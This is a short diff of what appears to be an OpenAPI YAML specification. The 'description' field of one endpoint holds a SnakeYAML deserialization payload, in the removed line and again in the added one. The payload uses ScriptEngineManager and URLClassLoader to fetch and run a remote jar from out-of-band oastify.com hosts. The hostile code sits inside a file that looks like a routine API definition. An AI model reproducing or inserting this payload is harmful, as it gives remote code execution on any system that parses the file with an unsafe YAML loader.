@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://i3mm22ptd4m8h1457xorrz5s9jfa3er3.oastify.com/payload.jar"]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [https://n8wr77uyi9rdm69ac2tww4axeokf8kw9.oastify.com/payload1.jar]]]]
       produces:
       - application/json
       responses:
